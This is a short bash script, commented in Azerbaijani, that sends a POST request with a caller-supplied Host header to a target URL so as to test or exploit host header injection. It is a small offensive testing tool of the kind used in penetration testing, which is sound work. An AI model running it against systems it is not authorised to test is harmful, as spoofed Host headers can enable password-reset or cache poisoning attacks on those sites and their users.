#!/bin/bash

# 1-ci argument: Host header
NEW_HOST=$1

# 2-ci argument: Target URL
TARGET_URL=$2

# 3-cü argument: POST data (form data)
FORM_DATA=$3

# Host Header Injection ilə POST request
curl -s -X POST "$TARGET_URL" \
-H "Host: $NEW_HOST" \
-d "$FORM_DATA"
